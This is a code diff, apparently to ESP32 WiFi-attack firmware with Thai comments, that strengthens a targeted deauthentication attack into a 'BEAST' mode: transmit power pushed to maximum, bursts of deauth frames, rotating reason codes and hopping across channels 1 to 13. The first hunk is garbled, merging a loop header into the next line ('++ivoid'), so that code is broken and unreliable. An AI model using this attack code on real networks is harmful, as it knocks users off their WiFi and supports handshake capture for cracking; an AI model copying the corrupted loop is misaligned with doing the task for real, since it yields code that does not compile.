@@ -487,8 +487,7 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
 
     // Sanitize SSID for use in filename
     String sanitizedSsid = "";
-    for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
-        char c = tssid[i];
+    for (size_t i = 0; i < tssid.length() && i < 32; ++ivoid        char c = tssid[i];
         if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
             c == '_' || c == '.') {
             sanitizedSsid += c;
@@ -754,14 +753,9 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     esp_wifi_init(&cfg);
     esp_wifi_set_mode(WIFI_MODE_STA);
     esp_wifi_set_promiscuous(true);
-    
-    // เปลี่ยน channel (retry)
-    for (int i = 0; i < 3; i++) {
-        if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) break;
-        delay(10);
-    }
-    
-    // เตรียม deauth frame (ไม่ต้องใช้ buildOptimizedDeauthFrame)
+    esp_wifi_set_max_tx_power(78);   // บีบกำลังส่งสูงสุด
+
+    // เตรียม deauth frame
     uint8_t bssid[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
@@ -770,7 +764,19 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     memcpy(&deauth_frame[10], bssid, 6);
     memcpy(&deauth_frame[16], bssid, 6);
 
-    // loop โจมตีเหมือนเดิม...
+    // เหตุผลต่าง ๆ สำหรับ deauth
+    const uint8_t reasons[] = {0x01, 0x04, 0x07, 0x08};
+    const uint8_t numReasons = sizeof(reasons);
+    uint8_t reasonIdx = 0;
+
+    // ชาแนลที่จะวิ่งวน
+    const uint8_t channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
+    const uint8_t numChannels = sizeof(channels);
+    uint8_t chIndex = 0;
+    uint8_t currentChannel = channels[0];
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+
+    // loop โจมตี
     const uint16_t UPDATE_INTERVAL_MS = 2000;
     uint32_t lastUpdateTime = millis();
     uint32_t frameCount = 0;
@@ -784,18 +790,37 @@ void target_atk(String tssid, String mac, uint8_t channel) {
 
     while (attackActive) {
         if (needsRedraw) {
-            drawMainBorderWithTitle("Target Deauth");
+            drawMainBorderWithTitle("Target Deauth (BEAST)");
             padprintln("");
             padprintln("AP: " + tssid);
-            padprintln("Channel: " + String(channel));
-            padprintln(mac);
+            padprintln("MAC: " + mac);
+            padprintln("Chan: " + String(currentChannel));
+            padprintln("Reason: 0x" + String(reasons[reasonIdx], HEX));
             vTaskDelay(50 / portTICK_PERIOD_MS);
             needsRedraw = false;
         }
 
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        frameCount += 3;
+        // ----- โจมตีเป็นชุด (burst) -----
+        for (int i = 0; i < 5; i++) {           // ยิง 5 รอบ x3 เฟรม = 15 เฟรมต่อลูป
+            deauth_frame[24] = reasons[reasonIdx]; // เปลี่ยน reason code
+            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+            frameCount += 3;
+        }
 
+        // เปลี่ยน reason code ทุก 50 เฟรม (ประมาณ 10 รอบ burst)
+        if (frameCount % 50 == 0) {
+            reasonIdx = (reasonIdx + 1) % numReasons;
+        }
+
+        // เปลี่ยนชาแนลทุก 200 เฟรม (40 รอบ burst) เพื่ออยู่นานขึ้น
+        if (frameCount % 200 == 0) {
+            chIndex = (chIndex + 1) % numChannels;
+            currentChannel = channels[chIndex];
+            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+            needsRedraw = true;
+        }
+
+        // อัปเดต FPS
         if (millis() - lastUpdateTime >= UPDATE_INTERVAL_MS) {
             float fps = (frameCount * 1000.0) / (millis() - lastUpdateTime);
             tft.setCursor(tftWidth * 0.05, tftHeight - (tftHeight * 0.08));
@@ -820,6 +845,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     WiFi.mode(WIFI_OFF);
     returnToMenu = true;
 }
+
 
 void generateRandomWiFiMac(uint8_t *mac) {
     for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
